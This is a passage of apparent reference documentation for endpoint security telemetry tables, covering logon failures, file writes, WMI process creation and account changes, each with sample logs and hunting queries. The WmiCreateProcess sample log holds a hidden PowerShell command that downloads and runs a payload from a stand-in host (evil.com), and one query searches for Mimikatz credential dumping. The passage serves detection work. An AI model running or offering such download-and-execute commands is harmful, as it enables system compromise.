event_simpleName=UserLogon LogonType=10 RemoteAddressIP4="10.0.5.25"

// Show all successful logons by users with administrative privileges
event_simpleName=UserLogon UserIsAdmin=true

// Investigate logons authenticated by a specific domain controller (Windows only)
event_simpleName=UserLogon LogonServer="DC02"
```
---
## UserLogonFailed Table: User Logon Failed Event

### 1. Table Name
**UserLogonFailed**

---

### 2. Table Usage
This event is generated when a user logon fails on a Windows host. It is useful for detecting potential security threats like brute-force attacks or other unauthorized access attempts.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user that attempted to log on. | Windows Only |
| UserSid | The Security Identifier (SID) of the user who failed to log on. | Windows Only |
| UserLogonFlags | Flags providing context about the user, such as if they are an administrator (`USER_IS_ADMIN`) or a local user (`USER_IS_LOCAL`). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "JSmith",
  "UserSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "UserLogonFlags": "2"
}
```
---

### 5. Example Queries
```xql
// Find all failed logon attempts for a specific username
event_simpleName=UserLogonFailed UserName="administrator"

// Find failed logons for a specific user SID
event_simpleName=UserLogonFailed UserSid="S-1-5-21-*"

// Find failed logons where the user has administrator privileges (UserLogonFlags=2)
event_simpleName=UserLogonFailed UserLogonFlags=2
```
---
## UserLogonFailed2 Table: User Logon Failed Event

### 1. Table Name
**UserLogonFailed2**

---

### 2. Table Usage
This event indicates that a user logon attempt failed, typically due to a bad password. It's useful for detecting potential security threats like brute-force attacks or other unauthorized access attempts. If the logon originated over the network, information about the remote computer will be included.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user that attempted to log on. | All |
| LogonDomain | The domain against which the user attempted to authenticate. | Windows Only |
| LogonType | Indicates the type of logon that was attempted, such as Interactive (2) or Network (3). | All |
| ClientComputerName | The name of the computer from which the logon attempt originated, if remote. | Windows, macOS |

---

### 4. Sample Log Example

```json
{
  "UserName": "admin",
  "LogonDomain": "WORKGROUP",
  "LogonType": "10",
  "ClientComputerName": "ATTACKER-PC"
}
```

---

### 5. Example Queries
```xql
// Find all failed logon attempts for a specific user
event_simpleName=UserLogonFailed2 UserName="administrator"

// Find failed remote interactive logons (LogonType=10)
event_simpleName=UserLogonFailed2 LogonType=10

// Investigate failed logons from a specific client computer
event_simpleName=UserLogonFailed2 ClientComputerName="SUSPICIOUS-ENDPOINT"

// Look for failed logons to a specific domain (Windows only)
event_simpleName=UserLogonFailed2 LogonDomain="CORPORATE"
```
---
## VmdkFileWritten Table: File Written Event

### 1. Table Name
**VmdkFileWritten**

---

### 2. Table Usage
This table records events when a VMDK (Virtual Machine Disk) file is written. VMDK files are used by virtualization software such as VMware. Monitoring the creation of these files can be important for tracking the setup of virtual environments, potential data exfiltration where data is packaged into a virtual disk, or the introduction of unauthorized virtual machines into the environment.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |
| TemporaryFileName | The temporary file name used during the write operation, if any. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\VMs\\New_Machine.vmdk",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "New_Machine.vmdk",
  "TemporaryFileName": "C:\\VMs\\~tmp_vmdk_1a2b3c.tmp"
}
```

---

### 5. Example Queries
```xql
// Find all VMDK files written to disk
event_simpleName=VmdkFileWritten TargetFileName="*.vmdk"

// Find VMDK files written to a network drive (Windows only)
event_simpleName=VmdkFileWritten IsOnNetwork=true

// Find VMDK files written to a removable disk (Windows only)
event_simpleName=VmdkFileWritten IsOnRemovableDisk=true

// Investigate VMDK file writes by a specific file operator SID (Windows only)
event_simpleName=VmdkFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find VMDK files that were created using a temporary file (Windows only)
event_simpleName=VmdkFileWritten a.TemporaryFileName!=""
```
---
## WebScriptFileWritten Table: File Written Event

### 1. Table Name
**WebScriptFileWritten**

---

### 2. Table Usage
This table records events when a web script file (e.g., JavaScript, VBScript) is written to disk. This activity is often associated with drive-by downloads or the saving of malicious scripts from web pages. Monitoring these events is useful for investigating malware delivery, data exfiltration, and the initial stages of a compromise.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\malicious_script.js",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "malicious_script.js"
}
```

---

### 5. Example Queries
```xql
// Find all JavaScript files written to disk
event_simpleName=WebScriptFileWritten TargetFileName="*.js"

// Find web scripts written to a network drive (Windows only)
event_simpleName=WebScriptFileWritten IsOnNetwork=true

// Find web scripts written to a removable disk (Windows only)
event_simpleName=WebScriptFileWritten IsOnRemovableDisk=true

// Investigate web script file writes by a specific file operator SID (Windows only)
event_simpleName=WebScriptFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find web scripts based on their context base file name
event_simpleName=WebScriptFileWritten ContextBaseFileName="payload.vbs"
```
---
## WmiCreateProcess Table: WMI Process Creation Event

### 1. Table Name
**WmiCreateProcess**

---

### 2. Table Usage
This event is generated when Windows Management Instrumentation (WMI) is used to start a new process. Since WMI is a default service that allows users to remotely manage machines and automate tasks, adversaries often abuse it to install tools, steal credentials, and move laterally within a network. Monitoring this event is useful for tracking an adversary's activity and identifying the origin of an attack during an intrusion.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| CommandLine | The command line used to create the new process. | Windows Only |
| ImageFileName | The full path to the main executable for the created process. | Windows Only |
| UserName | The user name associated with the process creation. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the RPC client that initiated the request. | Windows Only |
| AuthenticationId | The Logon ID for the token that created the process. Common values include SYSTEM (999) and NETWORK_SERVICE (996). | Windows Only |
| TokenType | The type of token associated with the process, such as a Primary (1) or Impersonation (2) token. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\powershell.exe",
  "CommandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/payload.ps1](http://evil.com/payload.ps1)')\"",
  "UserName": "NT AUTHORITY\\SYSTEM",
  "RpcClientProcessId": "1234",
  "AuthenticationId": "999",
  "TokenType": "1"
}
```

### 5. Example Queries
```xql
// Find WMI process creation events involving PowerShell
event_simpleName=WmiCreateProcess ImageFileName="*\\powershell.exe"

// Search for specific commands executed via WMI, such as credential dumping tools
event_simpleName=WmiCreateProcess CommandLine="*Invoke-Mimikatz*"

// Find processes created via WMI by a specific user
event_simpleName=WmiCreateProcess UserName="*Admin*"

// Investigate WMI activity originating from a specific RPC client process ID
event_simpleName=WmiCreateProcess RpcClientProcessId="1234"
```
---
## XarFileWritten Table: File Written Event

### 1. Table Name
**XarFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a XAR (eXtensible ARchive) file. This format is common for macOS installer files. It provides details about the file and the process involved, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/Users/admin/Downloads/installer.xar",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "installer.xar"
}
```

---

### 5. Example Queries
```xql
// Find all XAR files written with a specific target file name
event_simpleName=XarFileWritten TargetFileName="*installer.xar*"

// Find XAR files written to a network drive (Windows only)
event_simpleName=XarFileWritten IsOnNetwork=true

// Find XAR files written to a removable disk (Windows only)
event_simpleName=XarFileWritten IsOnRemovableDisk=true

// Investigate XAR file writes by a specific file operator SID (Windows only)
event_simpleName=XarFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find XAR files based on their context base file name
event_simpleName=XarFileWritten ContextBaseFileName="important_package.xar"
```
---
## ZipFileWritten Table: File Written Event

### 1. Table Name
**ZipFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a ZIP file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| TargetFileName      | The resulting file name that was written.                                          | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                         | Windows Only       |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                    | Windows Only       |
| ContextBaseFileName | The base name of the context file.                                                 | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\confidential_archive.zip",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "confidential_archive.zip"
}
```

---

### 5. Example Queries
```xql
// Find all ZIP files written with a specific target file name
event_simpleName=ZipFileWritten TargetFileName="*secret.zip*"

// Find ZIP files written to a network drive (Windows only)
event_simpleName=ZipFileWritten IsOnNetwork=true

// Find ZIP files written to a removable disk (Windows only)
event_simpleName=ZipFileWritten IsOnRemovableDisk=true

// Investigate ZIP file writes by a specific file operator SID (Windows only)
event_simpleName=ZipFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find ZIP files based on their context base file name
event_simpleName=ZipFileWritten ContextBaseFileName="backup.zip"
```
---


### 1. Table Name
**UserAccountCreated**

---

### 2. Table Usage
This event is generated when a new user account is created on a Windows host. Monitoring this event is crucial for security, as unexpected account creation can be an indicator of malicious activity, such as an attacker establishing persistence on a system. The event data can help identify the initial process (e.g., command-line tool, custom utility) or remote host that initiated the action.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the new user account that was created. | Windows Only |
| RpcClientProcessId | The Process ID (PID) corresponding to the RPC client of this request. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "TempAdmin01",
  "RpcClientProcessId": "784"
}
```

---

### 5. Example Queries

```xql// Find all user account creation events
event_simpleName=UserAccountCreated

// Investigate the creation of a specific user account
event_simpleName=UserAccountCreated UserName="BackupSvc"

// Find all user accounts created by a specific parent process ID
event_simpleName=UserAccountCreated RpcClientProcessId="1337"
```
---
## UserAccountDeleted Table: User Account Deletion Event

### 1. Table Name
**UserAccountDeleted**

---

### 2. Table Usage
This event is generated when a user account is deleted on a Windows host. It is critical for security auditing, as it can indicate malicious activity, such as an attacker trying to cover their tracks. The event can help identify the process or remote host that initiated the deletion.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user account that was deleted. | Windows, Forensics |
| RpcClientProcessId | The Process ID (PID) of the RPC client that initiated the account deletion request. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "TempAdmin",
  "RpcClientProcessId": "784"
}
```
---
### 5. Example Queries
```xql
// Find all user account deletion events
event_simpleName=UserAccountDeleted

// Investigate which process was responsible for deleting a specific user account
event_simpleName=UserAccountDeleted UserName="service-acct"

// Find all user accounts deleted by a specific process ID
event_simpleName=UserAccountDeleted RpcClientProcessId="1337"
```
---
